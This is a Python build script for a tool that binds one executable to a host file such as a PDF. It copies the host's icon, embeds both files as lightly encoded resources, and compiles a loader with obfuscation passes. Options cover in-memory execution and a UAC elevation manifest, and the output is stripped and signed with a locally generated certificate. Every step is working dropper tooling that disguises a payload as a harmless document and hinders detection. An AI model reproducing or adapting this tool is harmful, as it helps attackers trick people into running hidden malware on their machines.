#!/usr/bin/env python

import os
import io
import sys
import struct
import random
import argparse

from res2header import res2header

import pefile
from PIL import Image


GRPICONDIRENTRY_FORMAT = ('GRPICONDIRENTRY',
    ('B,Width', 'B,Height','B,ColorCount','B,Reserved',
     'H,Planes','H,BitCount','I,BytesInRes','H,ID'))
GRPICONDIR_FORMAT = ('GRPICONDIR', ('H,Reserved', 'H,Type','H,Count'))


class IconExtractorError(Exception):
    pass
class NoIconsAvailableError(IconExtractorError):
    pass
class InvalidIconDefinitionError(IconExtractorError):
    pass

class IconExtractor():
    def __init__(self, filename):
        self.filename = filename
        # Use fast loading and explicitly load the RESOURCE directory entry. This saves a LOT of time
        # on larger files
        self._pe = pefile.PE(filename, fast_load=True)
        self._pe.parse_data_directories(pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_RESOURCE'])

        if not hasattr(self._pe, 'DIRECTORY_ENTRY_RESOURCE'):
            raise NoIconsAvailableError("%s has no resources!" % filename)

        # Reverse the list of entries before making the mapping so that earlier values take precedence
        # When an executable includes multiple icon resources, we should use only the first one.
        resources = {rsrc.id: rsrc for rsrc in reversed(self._pe.DIRECTORY_ENTRY_RESOURCE.entries)}

        self.groupiconres = resources.get(pefile.RESOURCE_TYPE["RT_GROUP_ICON"])
        if not self.groupiconres:
            raise NoIconsAvailableError("%s has no group icon resources" % filename)
        self.rticonres = resources.get(pefile.RESOURCE_TYPE["RT_ICON"])

    def list_group_icons(self):
        """
        Returns a list of group icon entries.
        """
        return [(e.struct.Name, e.struct.OffsetToData)
                for e in self.groupiconres.directory.entries]

    def _get_group_icon_entries(self, num=0):
        """
        Returns the group icon entries for the specified group icon in the executable.
        """
        groupicon = self.groupiconres.directory.entries[num]
        if groupicon.struct.DataIsDirectory:
            # Select the first language from subfolders as needed.
            groupicon = groupicon.directory.entries[0]

        # Read the data pointed to by the group icon directory (GRPICONDIR) struct.
        rva = groupicon.data.struct.OffsetToData
        size = groupicon.data.struct.Size
        data = self._pe.get_data(rva, size)
        file_offset = self._pe.get_offset_from_rva(rva)

        grp_icon_dir = self._pe.__unpack_data__(GRPICONDIR_FORMAT, data, file_offset)
        # logger.debug(grp_icon_dir)

        if grp_icon_dir.Reserved:
            raise InvalidIconDefinitionError("Invalid group icon definition (got Reserved=%s instead of 0)" % hex(grp_icon_dir.Reserved))

        # For each group icon entry (GRPICONDIRENTRY) that immediately follows, read its data and save it.
        grp_icons = []
        icon_offset = grp_icon_dir.sizeof()
        for idx in range(grp_icon_dir.Count):
            grp_icon = self._pe.__unpack_data__(GRPICONDIRENTRY_FORMAT, data[icon_offset:], file_offset+icon_offset)
            icon_offset += grp_icon.sizeof()
            grp_icons.append(grp_icon)
            # logger.debug("Got logical group icon %s", grp_icon)

        return grp_icons

    def _get_icon_data(self, icon_ids):
        """
        Return a list of raw icon images corresponding to the icon IDs given.
        """
        icons = []
        icon_entry_lists = {icon_entry_list.id: icon_entry_list for icon_entry_list in self.rticonres.directory.entries}
        for icon_id in icon_ids:
            icon_entry_list = icon_entry_lists[icon_id]

            icon_entry = icon_entry_list.directory.entries[0]  # Select first language
            rva = icon_entry.data.struct.OffsetToData
            size = icon_entry.data.struct.Size
            data = self._pe.get_data(rva, size)
            # logger.debug("Exported icon with ID {icon_entry_list.id}: {icon_entry.struct}")
            icons.append(data)
        return icons

    def _write_ico(self, fd, num=0):
        """
        Writes ICO data to a file descriptor.
        """
        group_icons = self._get_group_icon_entries(num=num)
        icon_images = self._get_icon_data([g.ID for g in group_icons])
        icons = list(zip(group_icons, icon_images))
        assert len(group_icons) == len(icon_images)
        fd.write(b"\x00\x00") # 2 reserved bytes
        fd.write(struct.pack("<H", 1)) # 0x1 (little endian) specifying that this is an .ICO image
        fd.write(struct.pack("<H", len(icons)))  # number of images

        dataoffset = 6 + (len(icons) * 16)
        # First pass: write the icon dir entries
        for datapair in icons:
            group_icon, icon_data = datapair
            # Elements in ICONDIRENTRY and GRPICONDIRENTRY are all the same
            # except the last value, which is an ID in GRPICONDIRENTRY and
            # the offset from the beginning of the file in ICONDIRENTRY.
            fd.write(group_icon.__pack__()[:12])
            fd.write(struct.pack("<I", dataoffset))
            dataoffset += len(icon_data)  # Increase offset for next image

        # Second pass: write the icon data
        for datapair in icons:
            group_icon, icon_data = datapair
            fd.write(icon_data)

    def export_icon(self, fname, num=0):
        """
        Writes ICO data containing the program icon of the input executable.
        """
        with open(fname, 'wb') as f:
            self._write_ico(f, num=num)

    def get_icon(self, num=0):
        """
        Returns ICO data as a BytesIO() instance, containing the program icon of the input executable.
        """
        f = io.BytesIO()
        self._write_ico(f, num=num)
        return f

def gen_key():
    os.system("openssl genrsa -out sign.key 2048")
    os.system("openssl req -new -sha256 -out sign.req -key sign.key -config .\cert\sign.conf")
    os.system("openssl x509 -req -days 365 -CA .\cert\cacert.cer -CAkey .\cert\CA.key -CAcreateserial -in sign.req -out sign.cer -extensions req_ext -extfile .\cert\sign.conf")
    os.system("openssl pkcs12 -password pass:123456 -export -in sign.cer -inkey sign.key -out sign.pfx")


def remove_key():
    os.system("del sign.*")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Bind 2 exe files.")

    parser.add_argument('exefile', help="The exe file which need to bind.")
    parser.add_argument('--host', help="Host file.(Can be not a PE file, eg:pdf.)")
    parser.add_argument('--single', action="store_true", help="Enable single mode. (Memory load exefile only.)")
    
    parser.add_argument('--uac', action="store_true", help="Enable uac.")
    parser.add_argument('--no-gui', dest="ngui", action="store_true", help="Disable -mwindows CXXFLAG, works when the exefile is GUI exe file.")
    parser.add_argument('--x86', action="store_true", help="Enable -m32 CXXFLAG, when build in x64 platform.")
    parser.add_argument('--ico', type=str, help="Set bind file icon.")
    parser.add_argument('--out', type=str, help="Output binded exe file.")
    parser.add_argument('--prog', type=str, help="exefile file extract name (May not end in .exe when the exefile is not a PE file), and by default it is current file name.")
    parser.add_argument('--land', type=str, help="Landing Dir.(For no memory load situation.)")
    parser.add_argument('--unland', action="store_true", help="Enabel unland mode.(Memory load only.)")
    parser.add_argument('--desc', type=str, help="File description of output binded exe file.")
    parser.add_argument('--debug', action="store_true", help="Enable debug.")

    args = parser.parse_args()

    compiler = "clang++"
    result = False

    cxxflag = "%s %s %s" % (str("" if args.ngui else "-Wl,-subsystem,windows"), str("-target i686-pc-windows-gnu" if args.x86 else ""), str("-D _DEBUG -v" if args.debug else ""))
    single_mode = True if (args.single or not args.host) else False

    if args.unland:
        cxxflag += " -D_UNLAND"

    # cxxflag = "%s %s %s" % (str("" if args.ngui else "-mwindows"), str("-m32" if args.x86 else ""), str("-D _DEBUG" if args.debug else ""))
    if single_mode:
        single_mode = True
        cxxflag += " -D_SINGLE"
       
    else:
        res1 = res2header(args.host, "res1.h", chr(random.randint(0, 255)))
        host_exename = os.path.basename(args.host)
        progname = args.prog if args.prog else host_exename
    
    res2 = res2header(args.exefile, "res2.h", chr(random.randint(0, 255)))
    out = args.out if args.out else "out.exe"

    if compiler.startswith("clang"):
        cxxflag += " -mllvm -sobf -mllvm -fla -mllvm -sub "

    if args.ico:
        img = Image.open(args.ico)
        img.save("icon.ico")
        # pdb.set_trace()
    else:
        if single_mode:
            icon_file = args.exefile
        else:
            icon_file = args.host

        try:
            print("Parsing %s ico." % icon_file)
            extractor = IconExtractor(icon_file)
            extractor.export_icon("icon.ico", num=0)

        except Exception as e:
            print("Error in parsing ico: %s" % e)

    desc = args.desc if args.desc else os.path.basename(args.exefile).replace(".exe", "")
    with open("./res/icon.rc", "r") as ri:
        data = ri.read()
        data = data.replace("FILEDESCRIPTION", desc)
        with open("main.rc", "w") as wi:
            wi.write(data)

    os.system("windres %s --input-format=rc -O coff -i main.rc -o main.res" % str("-F pe-i386" if args.x86 else ""))
    icon_flag = True if os.path.exists("main.res") else False

    with open("./src/binder.cpp", "r") as rb:
        data = rb.read()
        if not single_mode:
            data = data.replace("RES_1111", res1["res_name"])
            data = data.replace("EXE1FILE", progname)
            cxxflag += " -DPROG1"

        data = data.replace("RES_2222", res2["res_name"])
        if args.land:
            data = data.replace("LANDPATH", args.land.replace("\\", "\\\\").replace("\\\\\\\\", "\\\\").replace("/", "\\\\"))
            cxxflag += " -D_LANDDIR"

    with open("main.cpp", "w") as wm:
        wm.write(data)

    if args.uac:
        os.system("windres %s --input-format=rc -O coff -i ./res/uac.rc -o uac.res" % str("-F pe-i386" if args.x86 else ""))

    cmd = "clang++ %s -Isrc -IC:\\TDM-GCC-64\\x86_64-w64-mingw32\include main.cpp ./src/memory_module.c %s %s -o %s" % (cxxflag, str("uac.res" if args.uac else ""), str("main.res" if icon_flag else ""), out)
    print(cmd)
    os.system(cmd)

    if os.path.exists(out):
        result = True
        os.system("strip %s" % out)

        gen_key()
        os.system("signtool sign /f sign.pfx /p 123456 /t http://timestamp.globalsign.com %s" % out)
        remove_key()

        print("Bind to %s success! " % out)
    '''
    os.remove("res1.h")
    os.remove("res2.h")
    os.remove("main.cpp")
    os.remove("main.rc")
    '''

    try:
        os.remove("uac.res")
    except:
        pass

    try:
        os.remove("main.res")
    except:
        pass

    try:
        os.remove("icon.ico")
        os.remove("icon.res")
    except:
        pass

